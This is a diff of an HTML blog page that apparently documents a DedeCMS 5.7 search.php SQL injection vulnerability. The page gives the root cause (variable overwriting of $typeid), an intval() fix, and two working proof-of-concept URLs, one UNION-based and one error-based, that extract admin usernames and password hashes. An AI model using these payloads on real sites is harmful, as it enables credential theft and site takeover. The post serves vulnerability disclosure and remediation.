@@ -311,7 +311,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://www.evalshell.com/2017/08/14/dede-search/">
+    <link itemprop="mainEntityOfPage" href="http://www.evalshell.com/2017/08/14/dede-search-sqli/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="fengxuan">
@@ -330,7 +330,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2017/08/14/dede-search/" itemprop="url">dede_search</a></h1>
+                <a class="post-title-link" href="/2017/08/14/dede-search-sqli/" itemprop="url">dede_search</a></h1>
         
 
         <div class="post-meta">
@@ -383,9 +383,9 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2017/08/14/dede-search/#comments" itemprop="discussionUrl">
+                <a href="/2017/08/14/dede-search-sqli/#comments" itemprop="discussionUrl">
                   <span class="post-comments-count disqus-comment-count"
-                        data-disqus-identifier="2017/08/14/dede-search/" itemprop="commentCount"></span>
+                        data-disqus-identifier="2017/08/14/dede-search-sqli/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -415,9 +415,8 @@
       
         
           
-            <p>#dedecms plus/search.php 注入漏洞</p>
-<p>##利用(poc)</p>
-<p>如果plus/search.php页面报错<code>Safe Alert: Request Error step 2 !</code> 则使用下面的poc：</p>
+            <h1 id="dedecms-plus-search-php-注入漏洞"><a href="#dedecms-plus-search-php-注入漏洞" class="headerlink" title="dedecms plus/search.php 注入漏洞"></a>dedecms plus/search.php 注入漏洞</h1><p>织梦在5.7的版本，20130111之前，存在search.php sql注入漏洞。</p>
+<h2 id="利用-poc"><a href="#利用-poc" class="headerlink" title="利用(poc)"></a>利用(poc)</h2><p>如果plus/search.php页面报错<code>Safe Alert: Request Error step 2 !</code> 则使用下面的poc：</p>
 <pre><code>/plus/search.php?keyword=as&amp;typeArr[111%3D@`&apos;`)+UnIon+seleCt+1,2,3,4,5,6,7,8,9,10,userid,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,pwd,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42+from+`%23@__admin`%23@`&apos;`+]=a
 </code></pre><p>如果提示<code>Safe Alert: Request Error step 1 !</code> 则使用</p>
 <pre><code>/plus/search.php?keyword=as&amp;typeArr[111%3D@`&apos;`)+and+(SELECT+1+FROM+(select+count(*),concat(floor(rand(0)*2),(substring((select+CONCAT(0x7c,userid,0x7c,pwd)+from+`%23@__admin`+limit+0,1),1,62)))a+from+information_schema.tables+group+by+a)b)%23@`&apos;`+]=a
@@ -427,8 +426,7 @@
 </code></pre><p>这样是需要重复的键值来触发报错。</p>
 <p>如图：</p>
 <p><img src="/uploads/images/dedecms_search_sqli.png" alt=""></p>
-<p>##漏洞原理</p>
-<p>dedecms有全局变量注册，所以在<code>require_once(dirname(__FILE__).&quot;/../include/common.inc.php&quot;);</code> 这个引用之后都会存在变量覆盖的危险。</p>
+<h2 id="漏洞原理-principle"><a href="#漏洞原理-principle" class="headerlink" title="漏洞原理(principle)"></a>漏洞原理(principle)</h2><p>dedecms有全局变量注册，所以在<code>require_once(dirname(__FILE__).&quot;/../include/common.inc.php&quot;);</code> 这个引用之后都会存在变量覆盖的危险。</p>
 <pre><code>require_once($typenameCacheFile);
 if(isset($typeArr) &amp;&amp; is_array($typeArr))
 {
@@ -449,10 +447,8 @@ if(isset($typeArr) &amp;&amp; is_array($typeArr))
 <pre><code>$query = &quot;SELECT tp.*,ch.typename as ctypename,ch.addtable,ch.issystem     FROM `#@__arctype` tp left join `#@__channeltype` ch
     on ch.id=tp.channeltype  WHERE tp.id=&apos;$typeid&apos; &quot;;
 </code></pre><p>造成注入。</p>
-<p>##修复方案(repair)</p>
-<p><code>$typeid = $id;</code> 改为 <code>$typeid = intval($id);</code>即可</p>
-<p>##参考链接(link)</p>
-<p><a href="https://www.unhonker.com/bug/907.html" target="_blank" rel="external">https://www.unhonker.com/bug/907.html</a></p>
+<h2 id="修复方案-repair"><a href="#修复方案-repair" class="headerlink" title="修复方案(repair)"></a>修复方案(repair)</h2><p><code>$typeid = $id;</code> 改为 <code>$typeid = intval($id);</code>即可</p>
+<h2 id="参考链接-link"><a href="#参考链接-link" class="headerlink" title="参考链接(link)"></a>参考链接(link)</h2><p><a href="https://www.unhonker.com/bug/907.html" target="_blank" rel="external">https://www.unhonker.com/bug/907.html</a></p>
 <p><a href="http://www.lijiejie.com/mysql-injection-error-based-duplicate-entry/" target="_blank" rel="external">http://www.lijiejie.com/mysql-injection-error-based-duplicate-entry/</a></p>
 
           
